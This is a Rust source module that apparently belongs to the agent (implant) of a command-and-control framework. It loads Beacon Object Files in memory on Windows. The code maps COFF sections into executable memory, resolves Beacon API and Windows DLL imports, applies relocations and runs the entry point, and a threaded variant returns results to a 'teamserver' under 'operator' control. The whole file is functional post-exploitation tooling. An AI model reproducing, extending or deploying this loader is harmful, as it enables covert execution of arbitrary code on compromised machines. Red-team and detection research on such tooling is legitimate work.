//! COFF/BOF (Beacon Object File) loader for inline execution.
//!
//! On Windows this module parses a COFF object file, maps its sections into
//! executable memory, resolves external imports (Beacon API functions and
//! dynamic DLL exports), applies relocations, and invokes the designated
//! entry point.
//!
//! On non-Windows targets the loader returns an error immediately — BOF
//! execution is only meaningful on a Windows host.

use tracing::warn;

#[cfg(windows)]
use crate::beacon_api::resolve_beacon_api;
#[cfg(windows)]
use crate::bof_context::BOF_OUTPUT_TLS;

// Re-export all public types so existing callers need no changes.
pub use crate::bof_context::{
    BOF_CALLBACK_ERROR, BOF_CALLBACK_OUTPUT, BOF_COULD_NOT_RUN, BOF_EXCEPTION, BOF_RAN_OK,
    BOF_SYMBOL_NOT_FOUND, BofCallback, BofContext, BofOutputQueue, BofResult, DataParser,
    clear_bof_context, new_bof_output_queue, set_bof_context,
};

// ─── Windows implementation ─────────────────────────────────────────────────

/// Execute a BOF (COFF object file) with the given entry function and arguments.
///
/// # Arguments
///
/// * `function_name` — Exported function to call (e.g. `"go"`).
/// * `object_data` — Raw COFF object file bytes.
/// * `arg_data` — Packed argument buffer for the BOF.
/// * `_threaded` — Whether to run in a dedicated thread (currently ignored;
///   all executions are synchronous).
///
/// Returns a [`BofResult`] containing one or more callbacks describing the
/// outcome.
#[cfg(windows)]
#[allow(unsafe_code)]
pub fn coffee_execute(
    function_name: &str,
    object_data: &[u8],
    arg_data: &[u8],
    _threaded: bool,
) -> BofResult {
    use std::collections::HashMap;

    // ── COFF structures ─────────────────────────────────────────────────

    const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
    const IMAGE_REL_AMD64_ADDR64: u16 = 1;
    const IMAGE_REL_AMD64_ADDR32NB: u16 = 3;
    const IMAGE_REL_AMD64_REL32: u16 = 4;

    const IMAGE_SCN_CNT_CODE: u32 = 0x0000_0020;
    const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
    const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;

    const COFF_HEADER_SIZE: usize = 20;
    const SECTION_HEADER_SIZE: usize = 40;
    const SYMBOL_SIZE: usize = 18;

    #[repr(C)]
    #[derive(Debug, Clone, Copy)]
    struct CoffHeader {
        machine: u16,
        number_of_sections: u16,
        time_date_stamp: u32,
        pointer_to_symbol_table: u32,
        number_of_symbols: u32,
        size_of_optional_header: u16,
        characteristics: u16,
    }

    #[repr(C)]
    #[derive(Debug, Clone, Copy)]
    struct SectionHeader {
        name: [u8; 8],
        virtual_size: u32,
        virtual_address: u32,
        size_of_raw_data: u32,
        pointer_to_raw_data: u32,
        pointer_to_relocations: u32,
        _pointer_to_linenumbers: u32,
        number_of_relocations: u16,
        _number_of_linenumbers: u16,
        characteristics: u32,
    }

    #[repr(C)]
    #[derive(Debug, Clone, Copy)]
    struct CoffRelocation {
        virtual_address: u32,
        symbol_table_index: u32,
        reloc_type: u16,
    }

    fn read_u16_le(data: &[u8], offset: usize) -> u16 {
        u16::from_le_bytes([data[offset], data[offset + 1]])
    }

    fn read_u32_le(data: &[u8], offset: usize) -> u32 {
        u32::from_le_bytes([data[offset], data[offset + 1], data[offset + 2], data[offset + 3]])
    }

    // ── Parse COFF header ───────────────────────────────────────────────

    if object_data.len() < COFF_HEADER_SIZE {
        return BofResult {
            callbacks: vec![BofCallback {
                callback_type: BOF_COULD_NOT_RUN,
                payload: Vec::new(),
                request_id: 0,
            }],
        };
    }

    let header = CoffHeader {
        machine: read_u16_le(object_data, 0),
        number_of_sections: read_u16_le(object_data, 2),
        time_date_stamp: read_u32_le(object_data, 4),
        pointer_to_symbol_table: read_u32_le(object_data, 8),
        number_of_symbols: read_u32_le(object_data, 12),
        size_of_optional_header: read_u16_le(object_data, 16),
        characteristics: read_u16_le(object_data, 18),
    };

    if header.machine != IMAGE_FILE_MACHINE_AMD64 {
        warn!(machine = header.machine, "BOF: unsupported COFF machine type");
        return BofResult {
            callbacks: vec![BofCallback {
                callback_type: BOF_COULD_NOT_RUN,
                payload: Vec::new(),
                request_id: 0,
            }],
        };
    }

    let num_sections = header.number_of_sections as usize;
    let sec_table_offset = COFF_HEADER_SIZE + header.size_of_optional_header as usize;
    let sym_table_offset = header.pointer_to_symbol_table as usize;
    let num_symbols = header.number_of_symbols as usize;

    // ── Parse section headers ───────────────────────────────────────────

    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let off = sec_table_offset + i * SECTION_HEADER_SIZE;
        if off + SECTION_HEADER_SIZE > object_data.len() {
            return BofResult {
                callbacks: vec![BofCallback {
                    callback_type: BOF_COULD_NOT_RUN,
                    payload: Vec::new(),
                    request_id: 0,
                }],
            };
        }

        let mut name = [0u8; 8];
        name.copy_from_slice(&object_data[off..off + 8]);
        sections.push(SectionHeader {
            name,
            virtual_size: read_u32_le(object_data, off + 8),
            virtual_address: read_u32_le(object_data, off + 12),
            size_of_raw_data: read_u32_le(object_data, off + 16),
            pointer_to_raw_data: read_u32_le(object_data, off + 20),
            pointer_to_relocations: read_u32_le(object_data, off + 24),
            _pointer_to_linenumbers: read_u32_le(object_data, off + 28),
            number_of_relocations: read_u16_le(object_data, off + 32),
            _number_of_linenumbers: read_u16_le(object_data, off + 34),
            characteristics: read_u32_le(object_data, off + 36),
        });
    }

    // ── Read string table ───────────────────────────────────────────────

    let str_table_offset = sym_table_offset + num_symbols * SYMBOL_SIZE;
    let get_symbol_name = |sym_offset: usize| -> String {
        let name_bytes = &object_data[sym_offset..sym_offset + 8];
        let first_four = read_u32_le(name_bytes, 0);
        if first_four == 0 {
            // Long name — offset into string table
            let str_off = read_u32_le(name_bytes, 4) as usize;
            let start = str_table_offset + str_off;
            if start < object_data.len() {
                let end = object_data[start..]
                    .iter()
                    .position(|&b| b == 0)
                    .map_or(object_data.len(), |p| start + p);
                String::from_utf8_lossy(&object_data[start..end]).to_string()
            } else {
                String::new()
            }
        } else {
            // Short name — inline in 8-byte field
            let end = name_bytes.iter().position(|&b| b == 0).unwrap_or(8);
            String::from_utf8_lossy(&name_bytes[..end]).to_string()
        }
    };

    // ── Allocate memory for sections ────────────────────────────────────

    let mut section_bases: Vec<*mut u8> = Vec::with_capacity(num_sections);
    for sec in &sections {
        let size = std::cmp::max(sec.size_of_raw_data, sec.virtual_size) as usize;
        if size == 0 {
            section_bases.push(std::ptr::null_mut());
            continue;
        }

        // SAFETY: allocating RW memory via VirtualAlloc.
        let base = unsafe {
            windows_sys::Win32::System::Memory::VirtualAlloc(
                std::ptr::null(),
                size,
                windows_sys::Win32::System::Memory::MEM_COMMIT
                    | windows_sys::Win32::System::Memory::MEM_RESERVE,
                windows_sys::Win32::System::Memory::PAGE_READWRITE,
            )
        } as *mut u8;

        if base.is_null() {
            // Free already allocated sections
            for &prev_base in &section_bases {
                if !prev_base.is_null() {
                    unsafe {
                        windows_sys::Win32::System::Memory::VirtualFree(
                            prev_base.cast(),
                            0,
                            windows_sys::Win32::System::Memory::MEM_RELEASE,
                        );
                    }
                }
            }
            return BofResult {
                callbacks: vec![BofCallback {
                    callback_type: BOF_COULD_NOT_RUN,
                    payload: Vec::new(),
                    request_id: 0,
                }],
            };
        }

        // Copy section data
        if sec.size_of_raw_data > 0 && sec.pointer_to_raw_data > 0 {
            let src_start = sec.pointer_to_raw_data as usize;
            let src_end = src_start + sec.size_of_raw_data as usize;
            if src_end <= object_data.len() {
                unsafe {
                    std::ptr::copy_nonoverlapping(
                        object_data[src_start..src_end].as_ptr(),
                        base,
                        sec.size_of_raw_data as usize,
                    );
                }
            }
        }

        section_bases.push(base);
    }

    // ── Build symbol table ──────────────────────────────────────────────

    let mut symbol_values: Vec<u64> = Vec::with_capacity(num_symbols);
    let mut external_symbols: HashMap<usize, String> = HashMap::new();
    let mut entry_point: Option<*const u8> = None;

    let mut sym_idx = 0usize;
    while sym_idx < num_symbols {
        let sym_off = sym_table_offset + sym_idx * SYMBOL_SIZE;
        if sym_off + SYMBOL_SIZE > object_data.len() {
            break;
        }

        let sym_name = get_symbol_name(sym_off);
        let _value = read_u32_le(object_data, sym_off + 8);
        let section_number = read_u16_le(object_data, sym_off + 12) as i16;
        let _sym_type = read_u16_le(object_data, sym_off + 14);
        let storage_class = object_data[sym_off + 16];
        let aux_count = object_data[sym_off + 17] as usize;

        let address = if section_number > 0 {
            let sec_idx = (section_number - 1) as usize;
            if sec_idx < section_bases.len() && !section_bases[sec_idx].is_null() {
                let base = section_bases[sec_idx] as u64;
                base + _value as u64
            } else {
                0
            }
        } else {
            0
        };

        // Storage class 2 = IMAGE_SYM_CLASS_EXTERNAL
        if storage_class == 2 && section_number == 0 {
            external_symbols.insert(sym_idx, sym_name.clone());
        }

        // Check if this is our entry point
        if sym_name == function_name && section_number > 0 {
            entry_point = Some(address as *const u8);
        }

        symbol_values.push(address);

        // Skip aux symbols
        symbol_values.extend(std::iter::repeat_n(0u64, aux_count as usize));
        sym_idx = sym_idx.saturating_add(aux_count as usize);
        sym_idx += 1;
    }

    // ── Resolve external imports ────────────────────────────────────────

    // BOF output buffer — Beacon API callbacks (BeaconPrintf / BeaconOutput)
    // append to this Vec through the thread-local `BOF_OUTPUT_TLS`.
    let mut bof_output: Vec<u8> = Vec::new();
    let bof_arg_data: *const u8 = arg_data.as_ptr();
    let bof_arg_len: u32 = arg_data.len() as u32;

    // FunMap: IAT-like table of function pointers.  For every `__imp_*`
    // symbol the COFF object contains an indirect call (`call [rip+disp32]`)
    // that loads the function address from a pointer-sized slot.  We
    // allocate those slots here and resolve the symbol to the slot address
    // (not the function address itself).  This matches the Havoc CoffeeLdr
    // FunMap approach.
    let mut fun_map: Vec<u64> = Vec::with_capacity(external_symbols.len());

    let mut resolved_imports: HashMap<usize, u64> = HashMap::new();
    let mut missing_symbols: Vec<String> = Vec::new();

    for (&sym_idx_key, sym_name) in &external_symbols {
        if sym_name.starts_with("__imp_Beacon") || sym_name.starts_with("__imp_toWideChar") {
            // Beacon API — resolve to a real implementation.
            if let Some(func_addr) = resolve_beacon_api(sym_name) {
                let slot_index = fun_map.len();
                fun_map.push(func_addr);
                let slot_addr = unsafe { fun_map.as_ptr().add(slot_index) } as u64;
                resolved_imports.insert(sym_idx_key, slot_addr);
            } else {
                // Unknown Beacon API — warn but don't fail the whole BOF.
                warn!(symbol = %sym_name, "BOF: unimplemented Beacon API, resolving as no-op");
                let slot_index = fun_map.len();
                fun_map.push(0);
                let slot_addr = unsafe { fun_map.as_ptr().add(slot_index) } as u64;
                resolved_imports.insert(sym_idx_key, slot_addr);
            }
        } else if let Some(import_name) = sym_name.strip_prefix("__imp_") {
            // strip __imp_
            if let Some(dollar_pos) = import_name.find('$') {
                let dll_name = &import_name[..dollar_pos];
                let func_name = &import_name[dollar_pos + 1..];

                let dll_cstr = format!("{dll_name}\0");
                let func_cstr = format!("{func_name}\0");

                let module = unsafe {
                    windows_sys::Win32::System::LibraryLoader::LoadLibraryA(dll_cstr.as_ptr())
                };
                if module.is_null() {
                    missing_symbols.push(sym_name.clone());
                    continue;
                }

                let proc = unsafe {
                    windows_sys::Win32::System::LibraryLoader::GetProcAddress(
                        module,
                        func_cstr.as_ptr(),
                    )
                };
                if let Some(addr) = proc {
                    let slot_index = fun_map.len();
                    fun_map.push(addr as usize as u64);
                    let slot_addr = unsafe { fun_map.as_ptr().add(slot_index) } as u64;
                    resolved_imports.insert(sym_idx_key, slot_addr);
                } else {
                    missing_symbols.push(format!("{dll_name}!{func_name}"));
                }
            } else {
                // Try resolving from ntdll or kernel32
                for dll in &["ntdll.dll\0", "kernel32.dll\0"] {
                    let module = unsafe {
                        windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(dll.as_ptr())
                    };
                    if module.is_null() {
                        continue;
                    }
                    let func_cstr = format!("{import_name}\0");
                    let proc = unsafe {
                        windows_sys::Win32::System::LibraryLoader::GetProcAddress(
                            module,
                            func_cstr.as_ptr(),
                        )
                    };
                    if let Some(addr) = proc {
                        let slot_index = fun_map.len();
                        fun_map.push(addr as usize as u64);
                        let slot_addr = unsafe { fun_map.as_ptr().add(slot_index) } as u64;
                        resolved_imports.insert(sym_idx_key, slot_addr);
                        break;
                    }
                }
                if !resolved_imports.contains_key(&sym_idx_key) {
                    missing_symbols.push(sym_name.clone());
                }
            }
        }
    }

    // Report missing symbols
    if !missing_symbols.is_empty() {
        let mut callbacks = Vec::new();
        for sym in &missing_symbols {
            let mut payload = Vec::new();
            let sym_bytes = sym.as_bytes();
            payload.extend_from_slice(&(sym_bytes.len() as u32).to_le_bytes());
            payload.extend_from_slice(sym_bytes);
            callbacks.push(BofCallback {
                callback_type: BOF_SYMBOL_NOT_FOUND,
                payload,
                request_id: 0,
            });
        }
        callbacks.push(BofCallback {
            callback_type: BOF_COULD_NOT_RUN,
            payload: Vec::new(),
            request_id: 0,
        });

        // Cleanup
        for &base in &section_bases {
            if !base.is_null() {
                unsafe {
                    windows_sys::Win32::System::Memory::VirtualFree(
                        base.cast(),
                        0,
                        windows_sys::Win32::System::Memory::MEM_RELEASE,
                    );
                }
            }
        }

        return BofResult { callbacks };
    }

    // ── Apply relocations ───────────────────────────────────────────────

    for (sec_idx, sec) in sections.iter().enumerate() {
        if sec.number_of_relocations == 0 || section_bases[sec_idx].is_null() {
            continue;
        }

        let reloc_offset = sec.pointer_to_relocations as usize;
        for r in 0..sec.number_of_relocations as usize {
            let roff = reloc_offset + r * 10; // each relocation entry is 10 bytes
            if roff + 10 > object_data.len() {
                break;
            }

            let reloc = CoffRelocation {
                virtual_address: read_u32_le(object_data, roff),
                symbol_table_index: read_u32_le(object_data, roff + 4),
                reloc_type: read_u16_le(object_data, roff + 8),
            };

            let sym_index = reloc.symbol_table_index as usize;
            let target_addr = if let Some(&imp_addr) = resolved_imports.get(&sym_index) {
                imp_addr
            } else if sym_index < symbol_values.len() {
                symbol_values[sym_index]
            } else {
                continue;
            };

            let patch_addr = unsafe { section_bases[sec_idx].add(reloc.virtual_address as usize) };

            match reloc.reloc_type {
                IMAGE_REL_AMD64_REL32 => {
                    // RIP-relative 32-bit displacement
                    let rip = patch_addr as u64 + 4; // next instruction
                    let delta = target_addr.wrapping_sub(rip) as i32;
                    unsafe {
                        std::ptr::copy_nonoverlapping(delta.to_le_bytes().as_ptr(), patch_addr, 4);
                    }
                }
                IMAGE_REL_AMD64_ADDR64 => unsafe {
                    std::ptr::copy_nonoverlapping(
                        target_addr.to_le_bytes().as_ptr(),
                        patch_addr,
                        8,
                    );
                },
                IMAGE_REL_AMD64_ADDR32NB => {
                    // Image-relative 32-bit address (no base)
                    let delta = target_addr as i32;
                    unsafe {
                        std::ptr::copy_nonoverlapping(delta.to_le_bytes().as_ptr(), patch_addr, 4);
                    }
                }
                _ => {
                    // Also handle REL32_1 through REL32_5 (reloc types 5-9)
                    if reloc.reloc_type >= 5 && reloc.reloc_type <= 9 {
                        let extra = (reloc.reloc_type - 4) as u64;
                        let rip = patch_addr as u64 + 4 + extra;
                        let delta = target_addr.wrapping_sub(rip) as i32;
                        unsafe {
                            std::ptr::copy_nonoverlapping(
                                delta.to_le_bytes().as_ptr(),
                                patch_addr,
                                4,
                            );
                        }
                    }
                }
            }
        }
    }

    // ── Set executable memory protections ───────────────────────────────

    for (i, sec) in sections.iter().enumerate() {
        if section_bases[i].is_null() {
            continue;
        }
        let size = std::cmp::max(sec.size_of_raw_data, sec.virtual_size) as usize;
        if size == 0 {
            continue;
        }

        let is_exec = sec.characteristics & (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE) != 0;
        let is_write = sec.characteristics & IMAGE_SCN_MEM_WRITE != 0;

        let prot = match (is_exec, is_write) {
            (true, true) => windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
            (true, false) => windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ,
            (false, true) => windows_sys::Win32::System::Memory::PAGE_READWRITE,
            (false, false) => windows_sys::Win32::System::Memory::PAGE_READONLY,
        };

        let mut old_prot: u32 = 0;
        unsafe {
            windows_sys::Win32::System::Memory::VirtualProtect(
                section_bases[i].cast(),
                size,
                prot,
                &mut old_prot,
            );
        }
    }

    // ── Execute the entry point ─────────────────────────────────────────

    // Install the output buffer into TLS so Beacon API callbacks can
    // append output during execution.
    BOF_OUTPUT_TLS.with(|cell| cell.set(&mut bof_output as *mut Vec<u8>));

    let callbacks = if let Some(ep) = entry_point {
        // BOF entry: void go(char* args, int arg_len)
        type BofEntry = unsafe extern "C" fn(*const u8, u32);
        let func: BofEntry = unsafe { std::mem::transmute(ep) };

        // Use SEH-style guard (simplified: catch panics)
        let exec_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| unsafe {
            func(bof_arg_data, bof_arg_len);
        }));

        match exec_result {
            Ok(()) => {
                let mut cbs = Vec::new();
                // If there's captured output, send it
                if !bof_output.is_empty() {
                    let mut payload = Vec::new();
                    payload.extend_from_slice(&(bof_output.len() as u32).to_le_bytes());
                    payload.extend_from_slice(&bof_output);
                    cbs.push(BofCallback {
                        callback_type: BOF_CALLBACK_OUTPUT,
                        payload,
                        request_id: 0,
                    });
                }
                cbs.push(BofCallback {
                    callback_type: BOF_RAN_OK,
                    payload: Vec::new(),
                    request_id: 0,
                });
                cbs
            }
            Err(_) => {
                vec![BofCallback {
                    callback_type: BOF_EXCEPTION,
                    payload: {
                        let mut p = Vec::new();
                        p.extend_from_slice(&0xE06D7363u32.to_le_bytes()); // C++ exception code
                        p.extend_from_slice(&(ep as u64).to_le_bytes()); // address
                        p
                    },
                    request_id: 0,
                }]
            }
        }
    } else {
        warn!(function_name, "BOF: entry point not found");
        vec![BofCallback { callback_type: BOF_COULD_NOT_RUN, payload: Vec::new(), request_id: 0 }]
    };

    // ── Cleanup ─────────────────────────────────────────────────────────

    for &base in &section_bases {
        if !base.is_null() {
            unsafe {
                windows_sys::Win32::System::Memory::VirtualFree(
                    base.cast(),
                    0,
                    windows_sys::Win32::System::Memory::MEM_RELEASE,
                );
            }
        }
    }

    // Clear TLS pointer — the bof_output Vec is about to go out of scope.
    BOF_OUTPUT_TLS.with(|cell| cell.set(std::ptr::null_mut()));

    // Keep fun_map alive until after cleanup (its slots were referenced
    // during BOF execution via the FunMap pointers).
    drop(fun_map);

    BofResult { callbacks }
}

// ─── Non-Windows stub ───────────────────────────────────────────────────────

/// On non-Windows targets, BOF execution is unsupported.
#[cfg(not(windows))]
pub fn coffee_execute(
    _function_name: &str,
    _object_data: &[u8],
    _arg_data: &[u8],
    _threaded: bool,
) -> BofResult {
    warn!("BOF execution is only supported on Windows");
    BofResult {
        callbacks: vec![BofCallback {
            callback_type: BOF_COULD_NOT_RUN,
            payload: Vec::new(),
            request_id: 0,
        }],
    }
}

// ─── Threaded BOF execution ─────────────────────────────────────────────────

/// Parameters transferred to a BOF thread created by [`coffee_execute_threaded`].
#[cfg(windows)]
struct BofThreadArgs {
    function_name: String,
    object_data: Vec<u8>,
    arg_data: Vec<u8>,
    output_queue: BofOutputQueue,
    request_id: u32,
    /// Spawn/token context to install on the new thread before BOF execution.
    spawn_ctx: BofContext,
}

/// Thread entry point for threaded BOF execution.
///
/// # Safety
///
/// `param` must point to a `Box<BofThreadArgs>` that was leaked by
/// [`coffee_execute_threaded`].  Ownership is reclaimed here.
#[cfg(windows)]
#[allow(unsafe_code)]
unsafe extern "system" fn bof_thread_entry(param: *mut std::ffi::c_void) -> u32 {
    // SAFETY: param is a Box<BofThreadArgs> leaked in coffee_execute_threaded.
    let args = unsafe { Box::from_raw(param.cast::<BofThreadArgs>()) };
    // Install spawn context on this thread so Beacon API callbacks
    // (BeaconGetSpawnTo, BeaconSpawnTemporaryProcess) see the configured paths.
    set_bof_context(&args.spawn_ctx);
    let result = coffee_execute(&args.function_name, &args.object_data, &args.arg_data, false);
    clear_bof_context();

    // Stamp the originating request ID on every callback so the teamserver can
    // correlate threaded BOF results with the correct task.
    let callbacks: Vec<BofCallback> = result
        .callbacks
        .into_iter()
        .map(|mut cb| {
            cb.request_id = args.request_id;
            cb
        })
        .collect();

    // Forward BOF callbacks to the shared output queue so the main agent loop
    // can drain and send them to the teamserver on the next iteration.
    if let Ok(mut queue) = args.output_queue.lock() {
        queue.extend(callbacks);
    }

    0
}

/// Spawn a BOF in a new Windows thread and return the thread `HANDLE`.
///
/// The returned handle (as `isize`) should be registered in a
/// [`crate::job::JobStore`] so the operator can suspend, resume, or kill the
/// thread via `CommandJob`.  Ownership of the handle is transferred to the
/// caller; close it (or let `JobStore::kill` do so) when the job is done.
///
/// BOF callbacks produced by the thread are pushed into `output_queue` so the
/// main agent loop can drain and forward them to the teamserver.
///
/// Returns `None` if `CreateThread` fails; in that case the argument memory is
/// reclaimed and no thread is started.
#[cfg(windows)]
#[allow(unsafe_code)]
pub fn coffee_execute_threaded(
    function_name: String,
    object_data: Vec<u8>,
    arg_data: Vec<u8>,
    output_queue: BofOutputQueue,
    request_id: u32,
    spawn_ctx: BofContext,
) -> Option<*mut core::ffi::c_void> {
    let args = Box::new(BofThreadArgs {
        function_name,
        object_data,
        arg_data,
        output_queue,
        request_id,
        spawn_ctx,
    });
    let param = Box::into_raw(args).cast::<std::ffi::c_void>();

    // SAFETY: param points to a valid Box<BofThreadArgs>; the thread
    // reclaims it via Box::from_raw in bof_thread_entry.
    let handle = unsafe {
        windows_sys::Win32::System::Threading::CreateThread(
            std::ptr::null(),
            0,
            Some(bof_thread_entry),
            param,
            0,
            std::ptr::null_mut(),
        )
    };

    if handle.is_null() {
        // CreateThread failed — reclaim to prevent a memory leak.
        // SAFETY: param still points to our Box<BofThreadArgs>, thread was not started.
        unsafe { drop(Box::from_raw(param.cast::<BofThreadArgs>())) };
        None
    } else {
        Some(handle)
    }
}

/// Non-Windows stub: threaded BOF execution is unsupported.
///
/// Always returns `None`; callers should fall back to synchronous execution.
#[cfg(not(windows))]
pub fn coffee_execute_threaded(
    _function_name: String,
    _object_data: Vec<u8>,
    _arg_data: Vec<u8>,
    _output_queue: BofOutputQueue,
    _request_id: u32,
    _spawn_ctx: BofContext,
) -> Option<*mut core::ffi::c_void> {
    warn!("Threaded BOF execution is only supported on Windows");
    None
}

#[cfg(test)]
#[path = "coffeeldr_tests.rs"]
mod tests;
